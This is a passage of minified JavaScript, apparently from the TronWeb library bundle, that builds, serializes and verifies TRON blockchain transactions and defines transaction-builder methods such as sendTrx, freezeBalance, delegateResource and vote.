                            u
                        }
                        ));
                        t.setEntrysList(n),
                        g.setAbi(t)
                    }
                    if (l && g.setCallValue(l),
                    g.setConsumeUserResourcePercent(o),
                    g.setOriginEnergyLimit(i),
                    f || (f = n),
                    g.setOriginAddress(IL(f)),
                    a) {
                        const e = a.replace(/^0x/, "") + c.replace(/^0x/, "");
                        g.setBytecode(BL(e))
                    }
                    return g.setName(h),
                    p.setNewContract(g),
                    OL(p, VD.Contract.ContractType.CREATESMARTCONTRACT, "CreateSmartContract", t.Permission_id)
                }
                )(t, r);
            case "ClearABIContract":
                return ( (e, t) => {
                    const {contract_address: r, owner_address: n} = e
                      , o = new aL;
                    return o.setOwnerAddress(IL(n)),
                    o.setContractAddress(IL(r)),
                    OL(o, VD.Contract.ContractType.CLEARABICONTRACT, "ClearABIContract", t.Permission_id)
                }
                )(t, r);
            case "UpdateBrokerageContract":
                return ( (e, t) => {
                    const {brokerage: r, owner_address: n} = e
                      , o = new gL;
                    return o.setOwnerAddress(IL(n)),
                    o.setBrokerage(r),
                    OL(o, VD.Contract.ContractType.UPDATEBROKERAGECONTRACT, "UpdateBrokerageContract", t.Permission_id)
                }
                )(t, r);
            case "AssetIssueContract":
                return ( (e, t) => {
                    const {owner_address: r, name: n, abbr: o, description: i, url: s, total_supply: a, trx_num: c, num: l, start_time: u, end_time: d, precision: h, free_asset_net_limit: f, public_free_asset_net_limit: p, public_free_asset_net_usage: g=0, public_latest_free_net_time: y=0, vote_score: m=0, frozen_supply: b} = e
                      , v = new oL;
                    if (v.setOwnerAddress(IL(r)),
                    n && v.setName(BL(n.replace(/^0x/, ""))),
                    o && v.setAbbr(BL(o.replace(/^0x/, ""))),
                    v.setTotalSupply(a),
                    v.setNum(l),
                    v.setEndTime(d),
                    v.setStartTime(u),
                    v.setTrxNum(c),
                    v.setVoteScore(m),
                    h && v.setPrecision(h),
                    y && v.setPublicLatestFreeNetTime(y),
                    i && v.setDescription(BL(i.replace(/^0x/, ""))),
                    s && v.setUrl(BL(s.replace(/^0x/, ""))),
                    v.setPublicFreeAssetNetUsage(g),
                    v.setFreeAssetNetLimit(f),
                    v.setPublicFreeAssetNetLimit(p),
                    b) {
                        const e = new oL.FrozenSupply;
                        e.setFrozenAmount(b.length ? b[0].frozen_amount : b.frozen_amount),
                        e.setFrozenDays(b.length ? b[0].frozen_days : b.frozen_days),
                        v.addFrozenSupply(e)
                    }
                    return OL(v, VD.Contract.ContractType.ASSETISSUECONTRACT, "AssetIssueContract", t.Permission_id)
                }
                )(t, r);
            case "AccountCreateContract":
                return ( (e, t) => {
                    const r = new yL
                      , {account_address: n, owner_address: o} = e;
                    return r.setOwnerAddress(IL(o)),
                    r.setAccountAddress(IL(n.replace(/^0x/, ""))),
                    OL(r, VD.Contract.ContractType.ACCOUNTCREATECONTRACT, "AccountCreateContract", t.Permission_id)
                }
                )(t, r);
            case "AccountUpdateContract":
                return ( (e, t) => {
                    const r = new mL
                      , {account_name: n, owner_address: o} = e;
                    return r.setOwnerAddress(IL(o)),
                    r.setAccountName(BL(n.replace(/^0x/, ""))),
                    OL(r, VD.Contract.ContractType.ACCOUNTUPDATECONTRACT, "AccountUpdateContract", t.Permission_id)
                }
                )(t, r);
            case "SetAccountIdContract":
                return ( (e, t) => {
                    const r = new bL
                      , {account_id: n, owner_address: o} = e;
                    return r.setOwnerAddress(IL(o)),
                    r.setAccountId(BL(n.replace(/^0x/, ""))),
                    OL(r, VD.Contract.ContractType.SETACCOUNTIDCONTRACT, "SetAccountIdContract", t.Permission_id)
                }
                )(t, r);
            case "ProposalCreateContract":
                return ( (e, t) => {
                    const r = new wL
                      , {owner_address: n, parameters: o} = e;
                    return r.setOwnerAddress(IL(n)),
                    o.forEach((e => {
                        r.getParametersMap().set(e.key, e.value)
                    }
                    )),
                    OL(r, VD.Contract.ContractType.PROPOSALCREATECONTRACT, "ProposalCreateContract", t.Permission_id)
                }
                )(t, r);
            case "ProposalDeleteContract":
                return ( (e, t) => {
                    const r = new TL
                      , {owner_address: n, proposal_id: o} = e;
                    return r.setOwnerAddress(IL(n)),
                    r.setProposalId(o),
                    OL(r, VD.Contract.ContractType.PROPOSALDELETECONTRACT, "ProposalDeleteContract", t.Permission_id)
                }
                )(t, r);
            case "ProposalApproveContract":
                return ( (e, t) => {
                    const r = new AL
                      , {owner_address: n, proposal_id: o, is_add_approval: i} = e;
                    return r.setOwnerAddress(IL(n)),
                    r.setProposalId(o),
                    r.setIsAddApproval(i),
                    OL(r, VD.Contract.ContractType.PROPOSALAPPROVECONTRACT, "ProposalApproveContract", t.Permission_id)
                }
                )(t, r);
            case "ExchangeCreateContract":
                return ( (e, t) => {
                    const r = new EL
                      , {owner_address: n, first_token_id: o, first_token_balance: i, second_token_id: s, second_token_balance: a} = e;
                    return r.setOwnerAddress(IL(n)),
                    r.setFirstTokenId(xL(o, t.visible)),
                    r.setFirstTokenBalance(i),
                    r.setSecondTokenId(xL(s, t.visible)),
                    r.setSecondTokenBalance(a),
                    OL(r, VD.Contract.ContractType.EXCHANGECREATECONTRACT, "ExchangeCreateContract", t.Permission_id)
                }
                )(t, r);
            case "ExchangeInjectContract":
                return ( (e, t) => {
                    const r = new PL
                      , {owner_address: n, exchange_id: o, token_id: i, quant: s} = e;
                    return r.setOwnerAddress(IL(n)),
                    r.setExchangeId(o),
                    r.setTokenId(xL(i, t.visible)),
                    r.setQuant(s),
                    OL(r, VD.Contract.ContractType.EXCHANGEINJECTCONTRACT, "ExchangeInjectContract", t.Permission_id)
                }
                )(t, r);
            case "ExchangeWithdrawContract":
                return ( (e, t) => {
                    const r = new CL
                      , {owner_address: n, exchange_id: o, token_id: i, quant: s} = e;
                    return r.setOwnerAddress(IL(n)),
                    r.setExchangeId(o),
                    r.setTokenId(xL(i, t.visible)),
                    r.setQuant(s),
                    OL(r, VD.Contract.ContractType.EXCHANGEWITHDRAWCONTRACT, "ExchangeWithdrawContract", t.Permission_id)
                }
                )(t, r);
            case "ExchangeTransactionContract":
                return ( (e, t) => {
                    const r = new SL
                      , {owner_address: n, exchange_id: o, token_id: i, quant: s, expected: a} = e;
                    return r.setOwnerAddress(IL(n)),
                    r.setExchangeId(o),
                    r.setTokenId(xL(i, t.visible)),
                    r.setQuant(s),
                    r.setExpected(a),
                    OL(r, VD.Contract.ContractType.EXCHANGETRANSACTIONCONTRACT, "ExchangeTransactionContract", t.Permission_id)
                }
                )(t, r);
            case "UpdateSettingContract":
                return ( (e, t) => {
                    const r = new lL
                      , {owner_address: n, contract_address: o, consume_user_resource_percent: i} = e;
                    return r.setOwnerAddress(IL(n)),
                    r.setContractAddress(IL(o)),
                    r.setConsumeUserResourcePercent(i),
                    OL(r, VD.Contract.ContractType.UPDATESETTINGCONTRACT, "UpdateSettingContract", t.Permission_id)
                }
                )(t, r);
            case "UpdateEnergyLimitContract":
                return ( (e, t) => {
                    const r = new cL
                      , {owner_address: n, contract_address: o, origin_energy_limit: i} = e;
                    return r.setOwnerAddress(IL(n)),
                    r.setContractAddress(IL(o)),
                    r.setOriginEnergyLimit(i),
                    OL(r, VD.Contract.ContractType.UPDATEENERGYLIMITCONTRACT, "UpdateEnergyLimitContract", t.Permission_id)
                }
                )(t, r);
            case "AccountPermissionUpdateContract":
                return WL(t, r);
            case "UpdateAssetContract":
                return ( (e, t) => {
                    const r = new iL
                      , {owner_address: n, description: o, url: i, new_limit: s, new_public_limit: a} = e;
                    return r.setOwnerAddress(IL(n)),
                    o && r.setDescription(BL(o.replace(/^0x/, ""))),
                    i && r.setUrl(BL(i.replace(/^0x/, ""))),
                    s && r.setNewLimit(s),
                    a && r.setNewPublicLimit(a),
                    OL(r, VD.Contract.ContractType.UPDATEASSETCONTRACT, "UpdateAssetContract", t.Permission_id)
                }
                )(t, r)
            }
        }
          , kL = e => {
            const t = e.raw_data
              , r = t.contract[0]
              , n = r.parameter.value
              , o = {
                Permission_id: r.Permission_id,
                visible: e.visible
            }
              , i = RL(r, n, o)
              , s = i.getRawData();
            return s.setRefBlockBytes(BL(t.ref_block_bytes)),
            s.setRefBlockHash(BL(t.ref_block_hash)),
            t.data && s.setData(BL(t.data)),
            t.fee_limit && s.setFeeLimit(t.fee_limit),
            t.expiration && s.setExpiration(t.expiration),
            t.timestamp && s.setTimestamp(t.timestamp),
            i.setRawData(s),
            i
        }
          , ML = function(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
              , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
            const n = e.raw_data
              , o = n.contract[0]
              , i = RL(o, t, {
                Permission_id: null === t || void 0 === t ? void 0 : t.Permission_id
            })
              , s = i.getRawData();
            return s.setRefBlockBytes(BL(n.ref_block_bytes)),
            s.setRefBlockHash(BL(n.ref_block_hash)),
            r.data && s.setData(BL(r.data.replace(/^0x/, ""))),
            (r.fee_limit || t.fee_limit) && s.setFeeLimit(r.fee_limit || t.fee_limit),
            n.expiration && s.setExpiration(n.expiration),
            n.timestamp && s.setTimestamp(n.timestamp),
            i.setRawData(s),
            i
        }
          , NL = (e, t) => {
            const r = t.getRawData().serializeBinary()
              , n = IC(r)
              , o = BB(r);
            return n.toLowerCase() === e.raw_data_hex.toLowerCase() && o.replace(/^0x/, "").toLowerCase() === e.txID.replace(/^0x/, "").toLowerCase()
        }
          , FL = e => IC(e.getRawData().serializeBinary())
          , UL = e => {
            const t = kL(e);
            return NL(e, t)
        }
          , DL = (e, t, r) => {
            const n = ML(e, t, r);
            return NL(e, n)
        }
          , LL = e => BB(e.getRawData().serializeBinary())
          , jL = {
            0: "AccountCreateContract",
            1: "TransferContract",
            2: "TransferAssetContract",
            4: "VoteWitnessContract",
            5: "WitnessCreateContract",
            6: "AssetIssueContract",
            9: "ParticipateAssetIssueContract",
            10: "AccountUpdateContract",
            11: "FreezeBalanceContract",
            12: "UnfreezeBalanceContract",
            13: "WithdrawBalanceContract",
            15: "UpdateAssetContract",
            16: "ProposalCreateContract",
            17: "ProposalApproveContract",
            18: "ProposalDeleteContract",
            19: "SetAccountIdContract",
            30: "CreateSmartContract",
            31: "TriggerSmartContract",
            33: "UpdateSettingContract",
            41: "ExchangeCreateContract",
            42: "ExchangeInjectContract",
            43: "ExchangeWithdrawContract",
            44: "ExchangeTransactionContract",
            45: "UpdateEnergyLimitContract",
            46: "AccountPermissionUpdateContract",
            48: "ClearABIContract",
            49: "UpdateBrokerageContract",
            54: "FreezeBalanceV2Contract",
            55: "UnfreezeBalanceV2Contract",
            56: "WithdrawExpireUnfreezeContract",
            57: "DelegateResourceContract",
            58: "UnDelegateResourceContract",
            59: "CancelAllUnfreezeV2Contract"
        }
          , zL = e => e.getAuthsList().map((e => {
            const t = IC(e.getPermissionName_asU8())
              , r = e.getAccount();
            return {
                permission_name: t,
                account: {
                    name: IC(r.getName_asU8()),
                    address: IC(r.getAddress_asU8())
                }
            }
        }
        ))
          , VL = (e, t) => {
            const r = VD.raw.deserializeBinary(MC(t))
              , n = r.getContractList()[0]
              , o = n.getParameter().getValue()
              , i = jL[n.getType()];
            if (e !== i)
                throw new Error("type ".concat(e, " dismatches with rawDataHex type ").concat(i));
            return [{
                contract: [{
                    parameter: {
                        value: {},
                        type_url: n.getParameter().getTypeUrl()
                    },
                    type: e,
                    Permission_id: n.getPermissionId()
                }],
                data: IC(r.getData()),
                fee_limit: r.getFeeLimit(),
                ref_block_bytes: IC(r.getRefBlockBytes_asU8()),
                ref_block_hash: IC(r.getRefBlockHash_asU8()),
                expiration: r.getExpiration(),
                timestamp: r.getTimestamp(),
                scripts: IC(r.getScripts_asU8()),
                auths: zL(r)
            }, o]
        }
          , HL = e => {
            switch (e) {
            case 0:
            default:
                return "BANDWIDTH";
            case 1:
                return "ENERGY"
            }
        }
          , qL = (e, t) => {
            if (!t)
                throw new Error("rawDataHex cannot be empty");
            if (!fS(t))
                throw new Error("rawDataHex is not a valid hex string");
            switch (e) {
            case "TriggerSmartContract":
                return ( (e, t) => {
                    const [r,n] = VL(e, t)
                      , o = sL.deserializeBinary(n);
                    return r.contract[0].parameter.value = {
                        owner_address: IC(o.getOwnerAddress_asU8()),
                        contract_address: IC(o.getContractAddress_asU8()),
                        call_value: o.getCallValue(),
                        data: IC(o.getData_asU8()),
                        call_token_value: o.getCallTokenValue(),
                        token_id: o.getTokenId()
                    },
                    r
                }
                )(e, t);
            case "FreezeBalanceV2Contract":
                return ( (e, t) => {
                    const [r,n] = VL(e, t)
                      , o = YD.deserializeBinary(n);
                    return r.contract[0].parameter.value = {
                        owner_address: IC(o.getOwnerAddress_asU8()),
                        frozen_balance: o.getFrozenBalance(),
                        resource: HL(o.getResource())
                    },
                    r
                }
                )(e, t);
            case "UnfreezeBalanceV2Contract":
                return ( (e, t) => {
                    const [r,n] = VL(e, t)
                      , o = JD.deserializeBinary(n);
                    return r.contract[0].parameter.value = {
                        owner_address: IC(o.getOwnerAddress_asU8()),
                        unfreeze_balance: o.getUnfreezeBalance(),
                        resource: HL(o.getResource())
                    },
                    r
                }
                )(e, t);
            case "CancelAllUnfreezeV2Contract":
                return ( (e, t) => {
                    const [r,n] = VL(e, t)
                      , o = XD.deserializeBinary(n);
                    return r.contract[0].parameter.value = {
                        owner_address: IC(o.getOwnerAddress_asU8())
                    },
                    r
                }
                )(e, t);
            case "DelegateResourceContract":
                return ( (e, t) => {
                    const [r,n] = VL(e, t)
                      , o = eL.deserializeBinary(n);
                    return r.contract[0].parameter.value = {
                        owner_address: IC(o.getOwnerAddress_asU8()),
                        balance: o.getBalance(),
                        lock: o.getLock(),
                        lock_period: o.getLockPeriod(),
                        receiver_address: IC(o.getReceiverAddress_asU8()),
                        resource: HL(o.getResource())
                    },
                    r
                }
                )(e, t);
            case "UnDelegateResourceContract":
                return ( (e, t) => {
                    const [r,n] = VL(e, t)
                      , o = tL.deserializeBinary(n);
                    return r.contract[0].parameter.value = {
                        owner_address: IC(o.getOwnerAddress_asU8()),
                        balance: o.getBalance(),
                        receiver_address: IC(o.getReceiverAddress_asU8()),
                        resource: HL(o.getResource())
                    },
                    r
                }
                )(e, t);
            case "WithdrawExpireUnfreezeContract":
                return ( (e, t) => {
                    const [r,n] = VL(e, t)
                      , o = QD.deserializeBinary(n);
                    return r.contract[0].parameter.value = {
                        owner_address: IC(o.getOwnerAddress_asU8())
                    },
                    r
                }
                )(e, t);
            default:
                throw new Error("trasaction ".concat(e, " not supported"))
            }
        }
        ;
        function GL(e) {
            return lj.fromUtf8(e).replace(/^0x/, "")
        }
        function $L(e) {
            return JSON.parse(JSON.stringify(e))
        }
        function KL() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            if ("undefined" === typeof e.ref_block_bytes && "undefined" === typeof e.ref_block_hash && "undefined" === typeof e.expiration && "undefined" === typeof e.timestamp)
                return !1;
            if ("string" !== typeof e.ref_block_bytes)
                throw new Error("Invalid ref_block_bytes provided.");
            if ("string" !== typeof e.ref_block_hash)
                throw new Error("Invalid ref_block_hash provided.");
            if ("number" !== typeof e.expiration)
                throw new Error("Invalid expiration provided.");
            if ("number" !== typeof e.timestamp)
                throw new Error("Invalid timestamp provided.");
            return !0
        }
        async function ZL(e, t, r, n) {
            let o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : {};
            const i = {
                visible: !1,
                txID: "",
                raw_data_hex: "",
                raw_data: (0,
                k.A)((0,
                k.A)({
                    contract: [{
                        parameter: {
                            value: r,
                            type_url: "type.googleapis.com/protocol.".concat(t)
                        },
                        type: t
                    }]
                }, KL(o) ? {} : await (s = e.fullNode,
                s.request("wallet/getblock", {
                    detail: !1
                }, "post").then((e => ({
                    ref_block_bytes: e.block_header.raw_data.number.toString(16).slice(-4).padStart(4, "0"),
                    ref_block_hash: e.blockID.slice(16, 32),
                    expiration: e.block_header.raw_data.timestamp + 6e4,
                    timestamp: e.block_header.raw_data.timestamp
                }))))), o)
            };
            var s;
            n && (i.raw_data.contract[0].Permission_id = n);
            const a = kL(i);
            return i.txID = LL(a).replace(/^0x/, ""),
            i.raw_data_hex = FL(a).toLowerCase(),
            i
        }
        function YL() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            const t = {};
            return KL(e.blockHeader) && (t.ref_block_bytes = e.blockHeader.ref_block_bytes,
            t.ref_block_hash = e.blockHeader.ref_block_hash,
            t.expiration = e.blockHeader.expiration,
            t.timestamp = e.blockHeader.timestamp),
            t
        }
        class JL {
            constructor(e) {
                if ((0,
                CI.A)(this, "tronWeb", void 0),
                (0,
                CI.A)(this, "validator", void 0),
                !e || !(e instanceof lj))
                    throw new Error("Expected instance of TronWeb");
                this.tronWeb = e,
                this.validator = new UD
            }
            async sendTrx(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.tronWeb.defaultAddress.hex
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
                t = parseInt(t),
                this.validator.notValid([{
                    name: "recipient",
                    type: "address",
                    value: e
                }, {
                    name: "origin",
                    type: "address",
                    value: r
                }, {
                    names: ["recipient", "origin"],
                    type: "notEqual",
                    msg: "Cannot transfer TRX to the same account"
                }, {
                    name: "amount",
                    type: "integer",
                    gt: 0,
                    value: t
                }]);
                const o = {
                    to_address: tF(e),
                    owner_address: tF(r),
                    amount: t
                }
                  , i = YL(n);
                return ZL(this.tronWeb, DD.TransferContract, o, null === n || void 0 === n ? void 0 : n.permissionId, i)
            }
            async sendToken(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0
                  , r = arguments.length > 2 ? arguments[2] : void 0
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : this.tronWeb.defaultAddress.hex
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : {};
                t = parseInt(t),
                this.validator.notValid([{
                    name: "recipient",
                    type: "address",
                    value: e
                }, {
                    name: "origin",
                    type: "address",
                    value: n
                }, {
                    names: ["recipient", "origin"],
                    type: "notEqual",
                    msg: "Cannot transfer tokens to the same account"
                }, {
                    name: "amount",
                    type: "integer",
                    gt: 0,
                    value: t
                }, {
                    name: "token ID",
                    type: "tokenId",
                    value: r
                }]);
                const i = {
                    to_address: tF(e),
                    owner_address: tF(n),
                    asset_name: GL(r),
                    amount: t
                }
                  , s = YL(o);
                return ZL(this.tronWeb, DD.TransferAssetContract, i, null === o || void 0 === o ? void 0 : o.permissionId, s)
            }
            async purchaseToken(e, t) {
                let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : this.tronWeb.defaultAddress.hex
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : {};
                this.validator.notValid([{
                    name: "buyer",
                    type: "address",
                    value: n
                }, {
                    name: "issuer",
                    type: "address",
                    value: e
                }, {
                    names: ["buyer", "issuer"],
                    type: "notEqual",
                    msg: "Cannot purchase tokens from same account"
                }, {
                    name: "amount",
                    type: "integer",
                    gt: 0,
                    value: r
                }, {
                    name: "token ID",
                    type: "tokenId",
                    value: t
                }]);
                const i = {
                    to_address: tF(e),
                    owner_address: tF(n),
                    asset_name: GL(t),
                    amount: parseInt(r)
                }
                  , s = YL(o);
                return ZL(this.tronWeb, DD.ParticipateAssetIssueContract, i, null === o || void 0 === o ? void 0 : o.permissionId, s)
            }
            async freezeBalance() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 3
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "BANDWIDTH"
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : this.tronWeb.defaultAddress.hex
                  , o = arguments.length > 4 ? arguments[4] : void 0
                  , i = arguments.length > 5 && void 0 !== arguments[5] ? arguments[5] : {};
                this.validator.notValid([{
                    name: "origin",
                    type: "address",
                    value: n
                }, {
                    name: "receiver",
                    type: "address",
                    value: o,
                    optional: !0
                }, {
                    name: "amount",
                    type: "integer",
                    gt: 0,
                    value: e
                }, {
                    name: "duration",
                    type: "integer",
                    gte: 3,
                    value: t
                }, {
                    name: "resource",
                    type: "resource",
                    value: r,
                    msg: 'Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"'
                }]);
                const s = {
                    owner_address: tF(n),
                    frozen_balance: parseInt(e),
                    frozen_duration: parseInt(String(t))
                };
                "BANDWIDTH" !== r && (s.resource = r),
                wS(o) && tF(o) !== tF(n) && (s.receiver_address = tF(o));
                const a = YL(i);
                return ZL(this.tronWeb, DD.FreezeBalanceContract, s, null === i || void 0 === i ? void 0 : i.permissionId, a)
            }
            async unfreezeBalance() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "BANDWIDTH"
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultAddress.hex
                  , r = arguments.length > 2 ? arguments[2] : void 0
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
                this.validator.notValid([{
                    name: "origin",
                    type: "address",
                    value: t
                }, {
                    name: "receiver",
                    type: "address",
                    value: r,
                    optional: !0
                }, {
                    name: "resource",
                    type: "resource",
                    value: e,
                    msg: 'Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"'
                }]);
                const o = {
                    owner_address: tF(t)
                };
                "BANDWIDTH" !== e && (o.resource = e),
                wS(r) && tF(r) !== tF(t) && (o.receiver_address = tF(r));
                const i = YL(n);
                return ZL(this.tronWeb, DD.UnfreezeBalanceContract, o, null === n || void 0 === n ? void 0 : n.permissionId, i)
            }
            async freezeBalanceV2() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "BANDWIDTH"
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.tronWeb.defaultAddress.hex
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
                this.validator.notValid([{
                    name: "origin",
                    type: "address",
                    value: r
                }, {
                    name: "amount",
                    type: "integer",
                    gt: 0,
                    value: e
                }, {
                    name: "resource",
                    type: "resource",
                    value: t,
                    msg: 'Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"'
                }]);
                const o = {
                    owner_address: tF(r),
                    frozen_balance: parseInt(e)
                };
                "BANDWIDTH" !== t && (o.resource = t);
                const i = YL(n);
                return ZL(this.tronWeb, DD.FreezeBalanceV2Contract, o, null === n || void 0 === n ? void 0 : n.permissionId, i)
            }
            async unfreezeBalanceV2() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "BANDWIDTH"
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.tronWeb.defaultAddress.hex
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
                this.validator.notValid([{
                    name: "origin",
                    type: "address",
                    value: r
                }, {
                    name: "amount",
                    type: "integer",
                    gt: 0,
                    value: e
                }, {
                    name: "resource",
                    type: "resource",
                    value: t,
                    msg: 'Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"'
                }]);
                const o = {
                    owner_address: tF(r),
                    unfreeze_balance: parseInt(e)
                };
                "BANDWIDTH" !== t && (o.resource = t);
                const i = YL(n);
                return ZL(this.tronWeb, DD.UnfreezeBalanceV2Contract, o, null === n || void 0 === n ? void 0 : n.permissionId, i)
            }
            async cancelUnfreezeBalanceV2() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                this.validator.notValid([{
                    name: "origin",
                    type: "address",
                    value: e
                }]);
                const r = {
                    owner_address: tF(e)
                }
                  , n = YL(t);
                return ZL(this.tronWeb, DD.CancelAllUnfreezeV2Contract, r, null === t || void 0 === t ? void 0 : t.permissionId, n)
            }
            async delegateResource() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0
                  , t = arguments.length > 1 ? arguments[1] : void 0
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "BANDWIDTH"
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : this.tronWeb.defaultAddress.hex
                  , o = arguments.length > 4 && void 0 !== arguments[4] && arguments[4]
                  , i = arguments.length > 5 ? arguments[5] : void 0
                  , s = arguments.length > 6 && void 0 !== arguments[6] ? arguments[6] : {};
                if (this.validator.notValid([{
                    name: "amount",
                    type: "integer",
                    gt: 0,
                    value: e
                }, {
                    name: "resource",
                    type: "resource",
                    value: r,
                    msg: 'Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"'
                }, {
                    name: "receiver",
                    type: "address",
                    value: t
                }, {
                    name: "origin",
                    type: "address",
                    value: n
                }, {
                    name: "lock",
                    type: "boolean",
                    value: o
                }, {
                    name: "lock period",
                    type: "integer",
                    gte: 0,
                    value: i,
                    optional: !0
                }]),
                tF(t) === tF(n))
                    throw new Error("Receiver address must not be the same as owner address");
                const a = {
                    owner_address: tF(n),
                    receiver_address: tF(t),
                    balance: parseInt(e)
                };
                "BANDWIDTH" !== r && (a.resource = r),
                o && (a.lock = o,
                wS(i) && (a.lock_period = i));
                const c = YL(s);
                return ZL(this.tronWeb, DD.DelegateResourceContract, a, null === s || void 0 === s ? void 0 : s.permissionId, c)
            }
            async undelegateResource() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0
                  , t = arguments.length > 1 ? arguments[1] : void 0
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "BANDWIDTH"
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : this.tronWeb.defaultAddress.hex
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : {};
                if (this.validator.notValid([{
                    name: "origin",
                    type: "address",
                    value: n
                }, {
                    name: "receiver",
                    type: "address",
                    value: t
                }, {
                    name: "amount",
                    type: "integer",
                    gt: 0,
                    value: e
                }, {
                    name: "resource",
                    type: "resource",
                    value: r,
                    msg: 'Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"'
                }]),
                tF(t) === tF(n))
                    throw new Error("Receiver address must not be the same as owner address");
                const i = {
                    owner_address: tF(n),
                    receiver_address: tF(t),
                    balance: parseInt(e)
                };
                "BANDWIDTH" !== r && (i.resource = r);
                const s = YL(o);
                return ZL(this.tronWeb, DD.UnDelegateResourceContract, i, null === o || void 0 === o ? void 0 : o.permissionId, s)
            }
            async withdrawExpireUnfreeze() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                this.validator.notValid([{
                    name: "origin",
                    type: "address",
                    value: e
                }]);
                const r = {
                    owner_address: tF(e)
                }
                  , n = YL(t);
                return ZL(this.tronWeb, DD.WithdrawExpireUnfreezeContract, r, null === t || void 0 === t ? void 0 : t.permissionId, n)
            }
            async withdrawBlockRewards() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                this.validator.notValid([{
                    name: "origin",
                    type: "address",
                    value: e
                }]);
                const r = {
                    owner_address: tF(e)
                }
                  , n = YL(t);
                return ZL(this.tronWeb, DD.WithdrawBalanceContract, r, null === t || void 0 === t ? void 0 : t.permissionId, n)
            }
            async applyForSR() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : ""
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                this.validator.notValid([{
                    name: "origin",
                    type: "address",
                    value: e
                }, {
                    name: "url",
                    type: "url",
                    value: t,
                    msg: "Invalid url provided"
                }, {
                    name: "url",
                    type: "string",
                    value: t,
                    lte: 256,
                    msg: "Invalid url provided"
                }]);
                const n = {
                    owner_address: tF(e),
                    url: GL(t)
                }
                  , o = YL(r);
                return ZL(this.tronWeb, DD.WitnessCreateContract, n, null === r || void 0 === r ? void 0 : r.permissionId, o)
            }
            async vote() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {}
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultAddress.hex
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                this.validator.notValid([{
                    name: "voter",
                    type: "address",
                    value: t
                }, {
                    name: "votes",
                    type: "notEmptyObject",
                    value: e
                }]);
                const n = Object.entries(e);
                for (const [a,c] of n)
                    this.validator.notValid([{
                        name: "SR",
                        type: "address",
                        value: a
                    }, {
                        name: "vote count",
                        type: "integer",
                        gt: 0,
                        value: c,
                        msg: "Invalid vote count provided for SR: " + a
                    }]);
                const o = n.map((e => {
                    let[t,r] = e;
                    return {
                        vote_address: tF(t),
                        vote_count: parseInt(r)
                    }
                }
                ))
                  , i = {
                    owner_address: tF(t),
                    votes: o
                }
                  , s = YL(r);
                return ZL(this.tronWeb, DD.VoteWitnessContract, i, null === r || void 0 === r ? void 0 : r.permissionId, s)
            }
            async createSmartContract() {
                var e;
                let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {}
                  , r = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultAddress.hex;
                const n = t.feeLimit || this.tronWeb.feeLimit;
